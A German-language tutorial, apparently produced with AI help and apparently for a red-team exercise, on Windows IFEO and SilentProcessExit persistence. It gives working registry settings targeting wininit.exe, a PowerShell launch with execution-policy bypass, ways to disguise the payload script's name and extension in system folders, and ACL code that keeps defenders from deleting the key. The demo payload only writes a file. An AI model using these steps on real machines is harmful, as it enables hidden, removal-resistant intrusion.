# Image File Execution Options (IFEO)

**Entstanden mit der Hile von KI (Claude)**

## Was ist das überhaupt?
IFEO ist ein Feature von Windows, das ursprünglich für Entwickler und Debugger gedacht war – also für legitime Zwecke entstanden ist. Der Name verrät schon viel: Es geht um Optionen, die beim Ausführen einer Image-Datei (also einer .exe) greifen.
Die Grundidee ist simpel: Ein Entwickler möchte ein Programm debuggen, sobald es startet – egal, wer es startet, egal aus welchem Kontext. Windows soll also automatisch den Debugger starten und das eigentliche Programm daran "anhängen". Das ist praktisch, weil man sonst den Debugger immer manuell an einen laufenden Prozess hängen müsste, was bei bestimmten Problemen (Race Conditions beim Start, z.B.) gar nicht funktioniert.
## Woher kommt es?
IFEO existiert seit den frühen NT-Versionen – also mindestens seit Windows NT 3.1 (Anfang der 90er). Es wurde von Microsoft als offizielles Debugging-Werkzeug eingeführt und ist bis heute Teil von Windows. Du findest es im Sysinternals-Umfeld dokumentiert, und Microsoft selbst schreibt offen darüber.
Der Registry-Pfad, um den sich alles dreht:
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\
## Wie funktioniert der Kern-Mechanismus?
Wenn Windows eine .exe startet, schaut der Windows Loader in diesem Registry-Schlüssel nach, ob es einen Unterordner mit dem exakten Dateinamen der Executable gibt – also z.B. notepad.exe. Existiert dort ein Debugger-Wert, passiert folgendes:
Windows startet nicht notepad.exe direkt, sondern startet stattdessen den im Debugger-Wert angegebenen Prozess – und übergibt den originalen Pfad zu notepad.exe als Kommandozeilenargument.
Konkret: Wenn du
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe
  Debugger = "C:\dbg\windbg.exe"
setzt, und dann jemand Notepad startet, passiert intern:
C:\dbg\windbg.exe "C:\Windows\System32\notepad.exe"
Der Debugger bekommt Notepad als Argument und kann es kontrolliert starten.
## Warum ist das aus Sicherheitsperspektive interessant?
Jetzt kommt der entscheidende Punkt: Windows prüft nicht, ob der Debugger-Wert wirklich ein Debugger ist. Es ist nur ein Pfad zu einer Executable. Das heißt: Du kannst dort beliebige Programme eintragen.
Außerdem greift der Mechanismus systemweit und für alle Benutzer – weil der Schlüssel unter HKLM liegt (also in der Hive, die Administratorrechte zum Schreiben braucht, aber beim Lesen für alle gilt).
Das macht IFEO zu einem klassischen Persistence-Mechanismus für Angreifer:

Kein neuer Prozess, der im Autostart auffällt
Kein Scheduled Task
Kein Service
Stattdessen: Das Malware-Programm startet genau dann, wenn ein legitimes Programm gestartet wird – also zuverlässig und unauffällig

Ein klassisches Beispiel aus der Praxis (und aus Penetration Tests): Die Accessibility-Tools auf dem Windows-Sperrbildschirm. Programme wie sethc.exe (Sticky Keys) oder utilman.exe laufen ohne angemeldeten Benutzer, weil sie vom Sperrbildschirm aus erreichbar sind. Wenn man dort per IFEO eine cmd.exe einträgt, bekommt man eine Shell mit SYSTEM-Rechten – ohne Login. Das war jahrelang eine bekannte Technik (ATT&CK T1546.012).


## Was ist SilentProcessExit?
SilentProcessExit funktioniert anders als der klassische Debugger-Wert und liegt an einer Stelle, die viele Defender-Scripts nicht auf dem Radar haben.

Mit dem Debugger Wert greife ich vor der Prozess Ausführung aktiv ein und kann den Start des Programms beeinträchtigen und das System bei seiner Arbeit stören.
Mit SilentProcessExit wird der Prozess auf jeden Fall ausgeführt fehlerfrei. Wenn ein Fehler in meiner Arbeit ist, dann wird mein Teil nicht ausgeführt - Pech für mich - aber sonst läuft alles weiter.


## Wo verstecken?
Die Boot-Reihenfolge in Windows (vereinfacht)
```
BIOS/UEFI
    ↓
Bootloader (bootmgr)
    ↓
Windows Kernel + HAL
    ↓
smss.exe  ← Session Manager, erster User-Mode Prozess
    ↓
csrss.exe + wininit.exe
    ↓
services.exe  ← startet alle Auto-Start Dienste
    ↓
winlogon.exe
    ↓
LogonUI / userinit.exe  ← erst hier kommt Login
```

**wininit.exe**
- Startet sehr früh (vor dem Login)
- Erledigt seine Aufgabe (initialisiert Session 0, startet services.exe, lsass.exe, winlogon.exe)
- Beendet sich danach

Das ist ein klassisches SilentProcessExit-Target in der Red-Team-Literatur.

## Wie es funktioniert
### Die zwei Schlüssel
Schritt 1 – unter IFEO, den kennst du schon:
```
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\wininit.exe
    GlobalFlag = 0x200  (REG_DWORD)
```
Dieser GlobalFlag-Wert mit 0x200 bedeutet: "Überwache diesen Prozess auf sein Ende." Er aktiviert den Mechanismus überhaupt erst.
Schritt 2 – an einer neuen Stelle:
```
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\wininit.exe
    MonitorProcess = "C:\pfad\zu\deinem\script.exe"
    ReportingMode  = 0x1  (REG_DWORD)
```
MonitorProcess ist dein Payload. ReportingMode = 1 sagt Windows: "Starte diesen Prozess, statt nur einen Dump zu schreiben."
### Das Zusammenspiel
```
wininit.exe beendet sich
      ↓
Windows Kernel prüft: GlobalFlag 0x200 gesetzt?
      ↓ ja
Windows schaut in SilentProcessExit\wininit.exe
      ↓
startet MonitorProcess
```
### Der Aufruf vom Skript
MonitorProcess erwartet eine .exe also muss das Skript so aufgerufen werden, dass es wie eine .exe aussieht.
```
MonitorProcess = "powershell.exe -ExecutionPolicy Bypass -File C:\pfad\script.ps1"
```
Kkeine externen Tools, nur Windows-Bordmittel.

### Inhalt vom Skript
```
Set-Content -Path "C:\Users\Public\Documents\pwned.txt" -Value "Pwn3d" -Encoding UTF8
```
### Das Versteck
Windows hat Ordner die:
- Bereits hunderte von .ps1 oder Systemdateien enthalten
- Von Defender-Scripts typischerweise als "vertrauenswürdig" behandelt werden
- Tief verschachtelt sind

Zum Beispiel:
```
C:\Windows\System32\
C:\Windows\SysWOW64\
C:\ProgramData\Microsoft\
```
Die Datei selbst tarnen:
```
meinScript.ps1          ← offensichtlich
versus
WerFaultSecure.ps1      ← klingt nach Windows
```
Dateiendung verschleiern
Du kannst das Script anders benennen und PowerShell trotzdem damit aufrufen:
```
WerFaultSecure.log
WerFaultSecure.dat
```

```
powershellpowershell.exe -ExecutionPolicy Bypass -File "C:\Windows\Temp\WerFaultSecure.dat"
```
PowerShell interessiert die Endung nicht – es führt den Inhalt aus.



### Der Schutz gegen Löschen
**Registry-ACLs**  Das ist der eigentliche Schutz:
```
Defender findet deinen SilentProcessExit-Eintrag
    ↓
Versucht ihn zu löschen
    ↓
Zugriff verweigert
```
Wenn der Defender deinen Registry-Schlüssel nicht löschen kann, ist es egal ob er ihn findet.
#### Wie funktioniert das konkret?
Mit PowerShell kannst du die ACL eines Registry-Schlüssels so setzen, dass nur SYSTEM schreiben darf:
```
$path = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\wininit.exe"
$acl = Get-Acl $path

# Alle bestehenden Regeln entfernen
$acl.SetAccessRuleProtection($true, $false)

# Nur SYSTEM darf lesen und schreiben
$rule = New-Object System.Security.AccessControl.RegistryAccessRule(
    "SYSTEM",
    "FullControl",
    "Allow"
)
$acl.AddAccessRule($rule)
Set-Acl -Path $path -AclObject $acl
```
Jetzt kann der Defender-Prozess – selbst als Administrator – den Schlüssel nicht löschen.

**Hinweis**
```
SYSTEM  → kann ACLs ignorieren (SeDebugPrivilege, SeTakeOwnershipPrivilege)
Admin   → kann Ownership übernehmen → dann ACL anpassen → dann löschen
```
ACLs sind also kein absoluter Schutz, sondern nur eine Hürde.

Selbst im schlechtesten Fall – Defender findet alles – schützt die ACL den Eintrag solange der Defender nicht explizit Ownership übernimmt.
```
Defender findet Eintrag + kann nicht löschen (ACL)
    ↓
Reboot
    ↓
SilentProcessExit triggert trotzdem
    ↓
pwned.txt wird erstellt
    ↓
Attacker gewinnt
```